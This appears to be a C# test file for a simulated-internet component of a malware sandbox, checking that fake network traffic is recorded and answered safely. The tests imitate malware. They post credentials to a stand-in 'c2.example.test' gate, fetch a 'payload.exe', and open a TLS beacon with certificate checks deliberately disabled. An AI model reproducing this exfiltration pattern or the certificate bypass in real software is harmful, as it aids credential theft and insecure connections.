using System.Collections.Concurrent;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using Blazma.Agent.FakeNet;

namespace Blazma.Agent.Tests;

public sealed class FakeInternetTests : IDisposable
{
    private readonly ConcurrentQueue<FakeNetRecord> _records = new();
    private readonly FakeInternet _net;

    public FakeInternetTests() => _net = new FakeInternet(_records.Enqueue);

    public void Dispose() => _net.Dispose();

    [Fact]
    public async Task Http_requests_are_recorded_and_answered()
    {
        var port = _net.ListenEphemeral(tls: false);
        using var client = new HttpClient();
        using var request = new HttpRequestMessage(HttpMethod.Post, $"http://127.0.0.1:{port}/gate.php?bot=1") { Content = new StringContent("user=alice&pw=secret") };
        request.Headers.Host = "c2.example.test";
        request.Headers.UserAgent.ParseAdd("EvilBot/1.0");
        using var response = await client.SendAsync(request);
        Assert.True(response.IsSuccessStatusCode);

        var r = await WaitForAsync("http");
        Assert.Equal("c2.example.test", r.Host);
        Assert.Equal("POST", r.Details["HttpMethod"]);
        Assert.Equal("/gate.php?bot=1", r.Details["HttpPath"]);
        Assert.Equal("EvilBot/1.0", r.Details["UserAgent"]);
        Assert.Contains("pw=secret", r.Details["BodyPreview"], StringComparison.Ordinal);
        Assert.Equal("true", r.Details["Simulated"]);
    }

    [Fact]
    public async Task Downloads_get_a_harmless_placeholder()
    {
        var port = _net.ListenEphemeral(tls: false);
        using var client = new HttpClient();
        var body = await client.GetStringAsync(new Uri($"http://127.0.0.1:{port}/payload.exe"));
        Assert.StartsWith("BLAZMA-SIMULATED-INTERNET", body, StringComparison.Ordinal);
        Assert.DoesNotContain("MZ", body[..2], StringComparison.Ordinal);
    }

    [Fact]
    public async Task Tls_server_name_is_recorded_and_https_requests_are_seen()
    {
        var port = _net.ListenEphemeral(tls: true);
        using var tcp = new TcpClient();
        await tcp.ConnectAsync("127.0.0.1", port);
        #pragma warning disable CA5359 // deliberately behaves like malware that ignores certificate errors
        await using var ssl = new SslStream(tcp.GetStream(), false, (_, _, _, _) => true);
#pragma warning restore CA5359
        await ssl.AuthenticateAsClientAsync("secure-c2.example.test");
        await ssl.WriteAsync(Encoding.ASCII.GetBytes("GET /beacon HTTP/1.1\r\nHost: secure-c2.example.test\r\n\r\n"));
        await ssl.FlushAsync();
        var buffer = new byte[256];
        var n = await ssl.ReadAsync(buffer);
        Assert.StartsWith("HTTP/1.1 200", Encoding.ASCII.GetString(buffer, 0, n), StringComparison.Ordinal);

        var tls = await WaitForAsync("tls");
        Assert.Equal("secure-c2.example.test", tls.Details["ServerName"]);
        var http = await WaitForAsync("http");
        Assert.Equal("https", http.Details["Protocol"]);
        Assert.Equal("/beacon", http.Details["HttpPath"]);
    }

    [Fact]
    public async Task Raw_ports_record_a_preview()
    {
        var port = _net.ListenEphemeral(tls: false, raw: true);
        using (var tcp = new TcpClient())
        {
            await tcp.ConnectAsync("127.0.0.1", port);
            await tcp.GetStream().WriteAsync(Encoding.ASCII.GetBytes("HELO bot\x01\x02"));
        }
        var r = await WaitForAsync("raw");
        Assert.Equal("HELO bot..", r.Details["BodyPreview"]);
    }

    private async Task<FakeNetRecord> WaitForAsync(string kind)
    {
        for (var i = 0; i < 100; i++)
        {
            var hit = _records.FirstOrDefault(r => r.Kind == kind);
            if (hit is not null) return hit;
            await Task.Delay(50);
        }
        throw new TimeoutException($"No {kind} record.");
    }
}
